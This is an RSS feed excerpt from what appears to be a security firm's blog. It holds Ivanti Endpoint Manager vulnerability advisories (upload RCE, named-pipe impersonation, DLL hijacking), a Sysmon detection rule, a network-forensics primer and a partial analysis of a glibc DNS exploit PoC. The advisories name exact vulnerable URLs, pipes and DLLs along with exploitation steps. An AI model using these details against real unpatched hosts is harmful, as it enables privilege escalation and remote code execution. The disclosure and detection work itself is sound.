      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/17330_dll_hijacking_event-1024x593.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;DLL Hijacking event captured by Sysmon. The image will show up as unsigned if the certificate is not trusted.&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;CVE-2020-13770 - Named pipe token impersonation&lt;/p&gt;
&lt;p&gt;This vulnerability is another classic in privilege escalation techniques; in fact, it is one of the methods meterpreter attempts when one runs &amp;ldquo;getsystem&amp;rdquo;. The issue takes place when a process opens a named pipe object without explicitly specifying proper security attributes. These security attributes can be specified when calling &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CreateFile&lt;/a&gt; on the &amp;ldquo;dwFlagsAndAttributes&amp;rdquo; parameter; among them, the following two are interesting from an attacker&amp;rsquo;s perspective:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SECURITY_DELEGATION - Impersonates a client at the Delegation impersonation level.&lt;/li&gt;
&lt;li&gt;SECURITY_IMPERSONATION - Impersonate a client at the impersonation level. This is the default behavior if no other flags are specified along with the SECURITY_SQOS_PRESENT flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first effectively allows for impersonation on remote hosts, while the second only allows that to happen locally. The problem relies on the fact that &amp;ldquo;SECURITY_IMPERSONATION&amp;rdquo; is the default value when no other attribute is specified, or when the &amp;ldquo;SECURITY_SQOS_PRESENT&amp;rdquo; flag is not set, which leads to this vulnerability being often introduced unwarily.&lt;/p&gt;
&lt;p&gt;Upon opening a named pipe with one of these two security attributes, the server has the access to obtain the client&amp;rsquo;s token and use it during subsequent access checks; in cases where the client has higher privileges than the server, the server would effectively obtain elevation of privileges. Any process can open a new named pipe object, granted that one with the same name does not already exist, although the impersonation process requires the server process to hold the SeImpersonatePrivilege privilege. By default this is assigned to service users, such as &amp;ldquo;nt authority\network service&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;A further requirement for the privilege escalation process is that the client must write some data to the named pipe before the impersonation process can take place. It is therefore possible for a process to open the pipe with insecure security attributes but not be exploitable to achieve EoP.&lt;/p&gt;
&lt;p&gt;With regards to detecting exploitation on Unified Endpoint Manager, having identified on which named pipe object the impersonation takes place, pipe creation events can be filtered on their name. Any process other than the legitimate pipe servers can be appended to the exclude rules to be filtered out. Since the pipe is specific to Ivanti software, such a configuration will be effective in giving no false positive. Further events can optionally be correlated to the one targeted here, such as process creations or file operation performed by the same process creating the named pipe object. Note that the exclude rule might need to be edited to the reader&amp;rsquo;s version of SQL Server.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;Sysmon schemaversion=&amp;#34;4.22&amp;#34;&amp;gt;
    &amp;lt;EventFiltering&amp;gt;
        &amp;lt;RuleGroup name=&amp;#34;CVE-2020-13770&amp;#34; groupRelation=&amp;#34;and&amp;#34;&amp;gt;
            &amp;lt;PipeEvent onmatch=&amp;#34;include&amp;#34;&amp;gt;
                &amp;lt;!-- Monitor CreatePipe events --&amp;gt;
                &amp;lt;EventType condition=&amp;#34;is&amp;#34;&amp;gt;CreatePipe&amp;lt;/EventType&amp;gt;
                &amp;lt;!-- Only log these named pipes --&amp;gt;
                &amp;lt;PipeName condition=&amp;#34;is&amp;#34;&amp;gt;\SQLLocal\ldmsdata&amp;lt;/PipeName&amp;gt;
            &amp;lt;/PipeEvent&amp;gt;
            &amp;lt;PipeEvent onmatch=&amp;#34;exclude&amp;#34;&amp;gt;
                &amp;lt;!-- Only log if the pipe is not created by these (legitimate) processes --&amp;gt;
                &amp;lt;Image condition=&amp;#34;is&amp;#34;&amp;gt;C:\Program Files\Microsoft SQL Server\MSSQL13.LDMSDATA\MSSQL\Binn\sqlservr.exe&amp;lt;/Image&amp;gt;
            &amp;lt;/PipeEvent&amp;gt;
        &amp;lt;/RuleGroup&amp;gt;
    &amp;lt;/EventFiltering&amp;gt;
&amp;lt;/Sysmon&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;figure&gt;
&lt;p&gt;&lt;img src=&#34;images/17330_named_pipe-1024x609.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;figcaption&gt;
&lt;p&gt;CreatePipe event captured by Sysmon.&lt;/p&gt;
&lt;/figcaption&gt;
&lt;/figure&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13774 - Ivanti Unified Endpoint Manager authenticated RCE via file upload</title>
      <link>//localhost:1313/articles/2020/11/2020-11-12-advisory-cve-2020-13774-ivanti-uem-rce/</link>
      <pubDate>Thu, 12 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-12-advisory-cve-2020-13774-ivanti-uem-rce/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1; &amp;lt;= 2019.1.3&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13774&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 12/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 9.9 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;Improper validation on file upload functionality present in Ivanti Unified Endpoint Manager&amp;rsquo;s web management console permits an authenticated user to upload .aspx files and execute them on the MS IIS server&amp;rsquo;s context. The issue is caused by insufficient file extension validation and insecure file operations on the uploaded image, which upon failure will leave the temporarily created files in an accessible location on the server.&lt;/p&gt;
&lt;p&gt;Solution&lt;/p&gt;
&lt;p&gt;The issue has been successfully resolved by the vendor in version 2020.1.1. Customers can install the latest available software update to fix the vulnerability. The vendor also communicated this has also been fixed in version 2019.1.4, although this has not been verified by JUMPSEC.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;The &amp;ldquo;/LDMS/softwaredistribution/EditLaunchPadDialog.aspx&amp;rdquo; URL permits the upload of an image file on the server. Security controls on the file extension are implemented client-side and can thus be easily bypassed. By crafting a proper .ico image file containing ASP code and uploading it with .aspx extension, it is later possible to access and execute the malicious file on &amp;ldquo;/landesk/files/&lt;filename&gt;.aspx&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;The user must be authenticated and either part of &amp;ldquo;LANDesk Admnistrators&amp;rdquo; group or both part of &amp;ldquo;Landesk Management Suite&amp;rdquo; group and be assigned to the &amp;ldquo;Software Distribution&amp;rdquo; role in order to access the vulnerable component.&lt;/p&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;15/04/2020: Issue reported to the vendor&lt;br&gt;
16/04/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
12/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13770 - Ivanti Unified Endpoint Manager named pipe token impersonation privilege escalation</title>
      <link>//localhost:1313/articles/2020/11/2020-11-11-advisory-cve-2020-13770-ivanti-uem-named-pipe-token-impersonation/</link>
      <pubDate>Wed, 11 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-11-advisory-cve-2020-13770-ivanti-uem-named-pipe-token-impersonation/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Unified Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1.1&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13770&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 11/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 8.8 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Local&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;Several services are accessing named pipes with default or overly permissive security attributes; as these services run as user &amp;lsquo;NT AUTHORITY\SYSTEM&amp;rsquo;, the issue can be used to escalate privileges from a local standard or service account having SeImpersonatePrivilege (eg. user &amp;lsquo;NT AUTHORITY\NETWORK SERVICE&amp;rsquo;).&lt;/p&gt;
&lt;p&gt;Mitigation&lt;/p&gt;
&lt;p&gt;There is currently no fix for this issue. The vendor has yet to release a patch to address the vulnerability; it is advised to review the host configuration and monitor for suspicious activity.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;The process of exploiting the vulnerability consists in creating a named pipe server, waiting for the vulnerable service to connect to it as a client, extract the client&amp;rsquo;s token and use it to perform privileged actions as &amp;lsquo;NT AUTHORITY\SYSTEM&amp;rsquo;. As there can only be one server-side named pipe object, to exploit the vulnerability it might be required to create the named pipe object before the legitimate process does, or alternatively kill it or cause it to crash.&lt;/p&gt;
&lt;p&gt;The following named pipe client processes and named pipe objects are affected on version &amp;lt;=2020.1.1:&lt;/p&gt;
&lt;p&gt;Pipe name: \\.\pipe\SQLLocal\ldmsdata&lt;br&gt;
Server process: C:\Program Files\Microsoft SQL Server\MSSQL13.LDMSDATA\MSSQL\Binn\sqlservr.exe&lt;br&gt;
Client processes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;C:\PROGRA&lt;del&gt;1\LANDesk\MANAGE&lt;/del&gt;1\landesk\SAM\SamServer\bin\SAM.O365PS_Routines.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\LDClient\LDdevmon.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\AlertService.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\BrokerService.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\ManagedPlanet.Core.Barcode.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\SchedQry.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\MDMManagementService.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\commands.service.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\CoreSyncService.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\ManagedPlanet.RapidDeploy.Service.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\MPCore.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\LDInv32.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\SchedSvc.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\ManagedPlanet.Common.DBMonitorService.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\ManagedPlanet.Common.SoftwareManager.exe&lt;/li&gt;
&lt;li&gt;C:\Program Files\LANDesk\ManagementSuite\ManagedPlanet.DiscoveryServices.Core.exe&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;28/05/2020: Issue reported to the vendor&lt;br&gt;
01/06/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
11/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2020-13771 - Ivanti Unified Endpoint Manager DLL search order hijacking privilege escalation</title>
      <link>//localhost:1313/articles/2020/11/2020-11-11-advisory-cve-2020-13771-ivanti-uem-dll-hijacking/</link>
      <pubDate>Wed, 11 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2020/11/2020-11-11-advisory-cve-2020-13771-ivanti-uem-dll-hijacking/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Ivanti Unified Endpoint Manager&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2020.1.1&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.ivanti.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.ivanti.com&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2020-13771&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 11/11/2020&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 8.1 - &lt;a href=&#34;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H&amp;amp;version=3.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AV:L/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Local&lt;br&gt;
&lt;strong&gt;Credit&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit, Calvin Yau&lt;/p&gt;
&lt;p&gt;Summary&lt;/p&gt;
&lt;p&gt;Various services running as user &amp;lsquo;NT AUTHORITY\SYSTEM&amp;rsquo; rely on Windows&amp;rsquo; DLL search order for loading DLL files that are not present on the filesystem. Under certain circumstances, a local attacker would be able to place a malicious DLL file to obtain code execution in the vulnerable service&amp;rsquo;s context to elevate privileges.&lt;/p&gt;
&lt;p&gt;Mitigation&lt;/p&gt;
&lt;p&gt;The vendor has released an update partially fixing the issue. 2019.1.4 and 2020.1.1 releases can be installed to remediate some of the instances; the remaining instances remain outstanding. It is advised to review the host configuration and monitor for suspicious activity.&lt;/p&gt;
&lt;p&gt;Technical details&lt;/p&gt;
&lt;p&gt;Affected services attempt to load DLL libraries which are not found on the filesystem relying on Windows&amp;rsquo; DLL search order. A local attacker able to place a purposely crafted library in one of the directories searched, such as one listed in the PATH system environment variable, would gain code execution in the context of the vulnerable service.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vulnerable instances on version &amp;lt;= 2020.1.1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Service &amp;ldquo;LANDesk Inventory Server&amp;rdquo;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ldprofileui.dll&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Vulnerable instances on version &amp;lt;= 2020.1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Service &amp;ldquo;LANDesk Inventory Server&amp;rdquo;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;wfapi.dll&lt;/li&gt;
&lt;li&gt;DMIAPI32.DLL&lt;/li&gt;
&lt;li&gt;logonsrv.dll&lt;/li&gt;
&lt;li&gt;ldprofileui.dll&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Service &amp;ldquo;LANDesk(R) Console Redirection Service&amp;rdquo;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OOBCredentials.dll&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Timeline&lt;/p&gt;
&lt;p&gt;15/04/2020: Issue reported to the vendor&lt;br&gt;
16/04/2020: Vendor acknowledged the issues&lt;br&gt;
02/06/2020: CVE number assigned from MITRE&lt;br&gt;
13/07/2020: 90 days notice period for disclosure given to the vendor&lt;br&gt;
11/11/2020: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Short introduction to Network Forensics and Indicators of Compromise (IoC)</title>
      <link>//localhost:1313/articles/2016/06/2016-06-28-short-introduction-network-forensics-indicators-compromise-ioc/</link>
      <pubDate>Tue, 28 Jun 2016 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2016/06/2016-06-28-short-introduction-network-forensics-indicators-compromise-ioc/</guid>
      <description>
        
        
        &lt;p&gt;“&lt;em&gt;Indicator of compromise (IOC) in computer forensics is an artifact observed on a network or in an operating system that with high confidence indicates a computer intrusion. Typical IOCs are virus signatures and IP addresses, MD5 hashes of malware files or URLs or domain names of botnet command and control servers. After IOCs have been identified in a process of incident response and computer forensics, they can be used for early detection of future attack attempts using intrusion detection systems and antivirus software.&lt;/em&gt;” &lt;em&gt;Wikipedia&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Hello w0rld! In this post I am planning to do a brief introduction into network forensics and how network monitoring can be used to identify successful attacks. Network monitoring is essential in order to identify reconnaissance activities such as port scans but also for identifying successful attacks such as planted malware (such as ransomware) or spear-phishing. Generally when doing network forensics the network footprint is of significant importance since it allows us to replicate the timeline of events. With that said, network footprint can still be obscured/hidden by using cryptographic means such as point-2-point encryption. Even if you can’t see the actual traffic because it is encrypted, what you can see is the bandwidth load which might be an IoC.&lt;/p&gt;
&lt;p&gt;In incident response the first step is the time that is needed for the attack realization. If the attack is not realized then of course there is no ‘incident response’ (doh!). There is a list of things that the analyst should go over in order to try to identify if an attack was successful. The list is not definite and there are far more things that need to be checked than those discussed here. Whether an attack is targeted or non-targeted, if it is utilizing the Internet connection in any way it will leave network footprints behind. In targeted attacks we see things like spear-phishing and USB planting that quite often are targeting susceptible individuals with lack of security awareness. Non-targeted attacks might include attack vectors such as malware, ransomware, malicious javascripts, flash exploits, etc. This is not exhausting since flash exploits and malicious javascripts can be used also in a targeted fashion. By identifying the Indicators of Compromise (IoC), we can have briefly describe each attack vector as follows depending on the network footprint that will have:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IP addresses&lt;/li&gt;
&lt;li&gt;domain names&lt;/li&gt;
&lt;li&gt;DNS resolve requests/response&lt;/li&gt;
&lt;li&gt;downloadable malicious content (javascripts, flash, PDF files with embedded scripts, DOCX with Macros enabled)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;There are also indicators coming out from behavioural analysis. For example a malware which contacts a Command &amp;amp; Control server will ‘beacon’ in a timely (usually) fashion. This ‘beaconing’ behaviour can be identified by monitoring spikes of specific traffic or bandwidth utilisation of a host. Moreover it can be spotted by monitoring out-of-hours behaviour since a host shouldn’t send data except of X type (which is legit) or shouldn’t be sending any data at all. Ransomware will encrypt all accessible filesystems/mounted drives and will ask (guess what!?) for money! Most likely it will be downloaded somehow or will be dropped by exploit kits or other malware. Sometimes it is delivered through email attachments (if mail administrator has no clue!). As stand-alone ‘version’ ransomware comes in portable executable (PE file) format. However variants of Cryptolocker are employing even PowerShell for doing so. In order to detect them we need a way to extract the files from the network dump. There are couple of tools that does this such as foremost but it is also possible to do it ‘manually’ through wireshark by exporting the objects. This assumes that the file transfer happened through an unencrypted channel and not under SSL. Malware might serve many different purposes such as stealing data, utilizing bandwidth for DDoS, or used as a ‘dropper’ where a ransomware is pushed. One of the more concerning is turning a compromised host into a zombie computer. Fast flux malware have numerous IPs associated with a single FQDN whereas domain flux malware have multiple FQDN per single IP. The latter is not ideal for malware authors since this IP will be easily identified and traffic will be dropped (a bit more about &amp;lsquo;&lt;em&gt;sinkhole&lt;/em&gt;&amp;rsquo; in the next paragraph!). Assuming that we are after a fast flux malware that uses a C&amp;amp;C, then there are ways to locate the malware by looking for beaconing. Quite often these malware make use of DGAs (Domain Generation Algorithms) which basically hide the C&amp;amp;C IP behind a series of different domain names. Malware that uses DGA are actively avoiding ‘sinkhole’ which allows ISPs to identify the malicious IP (C&amp;amp;C) and leading to the ‘blackhole’ of the traffic, shunning the communication of the infected system with it. An infected host will attempt to resolve (through DNS) a series of domain names acquired from the DGAs, This behaviour will lead to lots of ‘Non-Existent’ &lt;em&gt;NX&lt;/em&gt; responses from the name server back to the infected machine. Monitoring the number of &lt;em&gt;NX&lt;/em&gt; responses might help us identify infected systems. Moreover monitoring the DNS queries should also help.&lt;/p&gt;
&lt;p&gt;In a latter post I will publish a small script that I am using for looking for IoC.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_217&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;300&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/06/options.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/options-300x133.png&#34; alt=&#34;Main menu&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Script under development ;)[/caption]&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>CVE 2015-7547 glibc getaddrinfo() DNS Vulnerability</title>
      <link>//localhost:1313/articles/2016/03/2016-03-07-cve-2015-7547-glibc-getaddrinfo-dns-vulnerability/</link>
      <pubDate>Mon, 07 Mar 2016 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2016/03/2016-03-07-cve-2015-7547-glibc-getaddrinfo-dns-vulnerability/</guid>
      <description>
        
        
        &lt;p&gt;Hello w0rld! JUMPSEC researchers have spent some time on the glibc DNS vulnerability indexed as CVE 2015-7547 (It hasn’t got a cool name like GHOST unfortunately…). It appears to be a highly critical vulnerability and covers a large number of systems. It allows remote code execution by a stack-based overflow in the client side DNS resolver. In this post we would like to present our analysis.&lt;/p&gt;
&lt;h2&gt;Google POC overview&lt;span class=&#34;absolute -mt-20&#34; id=&#34;google-poc-overview&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#google-poc-overview&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/1sts.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/1sts.png&#34; alt=&#34;1sts&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Google POC Network Exploitation Timeline&lt;span class=&#34;absolute -mt-20&#34; id=&#34;google-poc-network-exploitation-timeline&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#google-poc-network-exploitation-timeline&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/draw-io_glibc-1.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/draw-io_glibc-1.png&#34; alt=&#34;draw-io_glibc (1)&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Google POC Exploit Code Analysis&lt;span class=&#34;absolute -mt-20&#34; id=&#34;google-poc-exploit-code-analysis&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#google-poc-exploit-code-analysis&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;First response&lt;span class=&#34;absolute -mt-20&#34; id=&#34;first-response&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#first-response&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;[caption id=&amp;ldquo;attachment_184&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;741&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/test.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/test.png&#34; alt=&#34;test&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Code snippet[/caption]&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter1.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter1.png&#34; alt=&#34;alter1&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Packet capture snippet&lt;/p&gt;
&lt;p&gt;The dw() function calls a “struct” module from python library. According to the documentation, it performs conversion between python values and C structs represented as python strings. In this case, it interprets python integer and pack it into little-endian short type binary data. This is a valid response sent by the “malicious” DNS server when it receives any initial queries. This response packet is constructed intentionally in large size (with 2500 bytes of null), it forces the client to retry over TCP and allocate additional memory buffer for the next response. This also triggers the dual DNS query from getaddrinfo() on the client side, which is a single request containing A and AAAA queries concatnated.&lt;/p&gt;
&lt;h3&gt;Second Response&lt;span class=&#34;absolute -mt-20&#34; id=&#34;second-response&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#second-response&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;[caption id=&amp;ldquo;attachment_162&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;531&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter3.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter3.png&#34; alt=&#34;alter3&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Code snippet[/caption]&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_163&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;484&amp;rdquo;]&lt;a href=&#34;https://labs.jumpsec.com/wp-content/uploads/sites/2/2016/03/alter4.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;img src=&#34;images/alter4.png&#34; alt=&#34;alter4&#34; loading=&#34;lazy&#34; /&gt;&lt;/a&gt; Packet capture snippet[/caption]&lt;/p&gt;
&lt;p&gt;This is the second response sent by the malicious DNS server. It is a malformed packet sending large numbers of “fake records” (184 Answer RRs) back to the client. According to google, this forces __libc_res_nsend to retry the query.&lt;/p&gt;
&lt;h3&gt;Third response&lt;span class=&#34;absolute -mt-20&#34; id=&#34;thirdresponse&#34;&gt;&lt;/span&gt;
